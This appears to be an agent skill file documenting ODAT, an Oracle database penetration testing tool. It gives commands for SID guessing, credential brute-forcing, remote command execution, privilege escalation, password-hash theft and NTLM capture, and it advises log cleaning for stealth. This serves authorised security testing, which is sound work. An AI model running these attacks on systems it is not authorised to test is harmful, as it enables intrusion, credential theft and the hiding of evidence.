---
name: odat
description: Oracle Database Attacking Tool (ODAT) is an open-source penetration testing tool used to test the security of Oracle Databases remotely. Use it to find valid SIDs, brute-force credentials, escalate privileges to DBA/SYSDBA, execute system commands, or perform file operations on the host operating system. It is essential for Oracle database reconnaissance, exploitation, and post-exploitation phases.
---

# odat

## Overview
ODAT is a modular tool designed to automate the process of enumerating and exploiting Oracle databases. It covers the entire attack lifecycle from initial discovery (SID/Service Name guessing) to advanced exploitation (TNS poisoning, CVE exploitation) and post-exploitation (command execution, file manipulation, privilege escalation). Category: Exploitation / Vulnerability Analysis.

## Installation (if not already installed)
ODAT is typically pre-installed on Kali Linux. If missing, install it and its dependencies:

```bash
sudo apt update
sudo apt install odat
```

## Common Workflows

### 1. Initial Enumeration (SID Guessing)
Find valid SIDs on a remote Oracle listener:
```bash
odat sidguesser -s 192.168.1.10 -p 1521
```

### 2. Credential Brute Forcing
Once a SID is known (e.g., `XE`), search for valid usernames and passwords:
```bash
odat passwordguesser -s 192.168.1.10 -p 1521 -d XE --accounts-file accounts.txt
```

### 3. Remote Command Execution (Java)
If you have valid credentials with sufficient permissions, execute a system command:
```bash
odat java -s 192.168.1.10 -p 1521 -d XE -U scott -P tiger --exec "whoami"
```

### 4. Privilege Escalation
Attempt to escalate the current user's privileges to DBA:
```bash
odat privesc -s 192.168.1.10 -p 1521 -d XE -U scott -P tiger --dba-privs
```

### 5. Run All Modules
Automatically test for all possible vulnerabilities and misconfigurations:
```bash
odat all -s 192.168.1.10 -p 1521 -d XE
```

## Complete Command Reference

### Global Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |
| `--version` | Show program's version number and exit |

### Main Modules (Subcommands)
| Subcommand | Description |
|------------|-------------|
| `all` | Run all modules to identify possible attack vectors |
| `tnscmd` | Communicate with the TNS listener |
| `tnspoison` | Exploit TNS poisoning attack (SID required) |
| `sidguesser` | Enumerate valid SIDs |
| `snguesser` | Enumerate valid Service Names |
| `passwordguesser` | Brute-force valid credentials |
| `utlhttp` | Send HTTP requests or scan ports via UTL_HTTP |
| `httpuritype` | Send HTTP requests or scan ports via HTTPURITYPE |
| `utltcp` | Scan ports via UTL_TCP |
| `ctxsys` | Read files using CTXSYS |
| `externaltable` | Read files or execute system commands/scripts via external tables |
| `dbmsxslprocessor` | Upload files using DBMS_XSLPROCESSOR |
| `dbmsadvisor` | Upload files using DBMSADVISOR |
| `utlfile` | Download, upload, or delete files via UTL_FILE |
| `dbmsscheduler` | Execute system commands without standard output |
| `java` | Execute system commands via Java Stored Procedures |
| `passwordstealer` | Extract hashed Oracle passwords |
| `oradbg` | Execute a binary or script via ORADBG |
| `dbmslob` | Download files using DBMS_LOB |
| `stealremotepwds` | Sniff/steal hashed passwords (CVE-2012-3137) |
| `userlikepwd` | Test if usernames match their passwords |
| `smb` | Capture SMB authentication (NTLM hashes) |
| `privesc` | Attempt privilege escalation |
| `cve` | Exploit specific Oracle CVEs |
| `search` | Search for sensitive data in databases, tables, and columns |
| `unwrapper` | Unwrap PL/SQL source code (not for 9i) |
| `clean` | Clean traces and logs from the target |

### Common Module Arguments
Most modules (except `sidguesser`/`snguesser`) require connection details:

| Flag | Description |
|------|-------------|
| `-s <server>` | Target server IP or hostname |
| `-p <port>` | Target port (default: 1521) |
| `-d <sid>` | Target SID |
| `-U <user>` | Username |
| `-P <pass>` | Password |
| `--sysdba` | Connect as SYSDBA |
| `--sysoper` | Connect as SYSOPER |

## Notes
- **Oracle Instant Client**: ODAT requires the Oracle Instant Client to be configured correctly in the system path to function.
- **Permissions**: Many modules (like `java` or `externaltable`) require specific permissions or roles (e.g., `CREATE ANY DIRECTORY`, `JAVAUSERPRIV`).
- **TNS Poisoning**: This attack is particularly effective against older, unpatched Oracle installations where the listener allows remote registration.
- **Stealth**: Use the `clean` module after exploitation to remove temporary objects or logs created during the attack.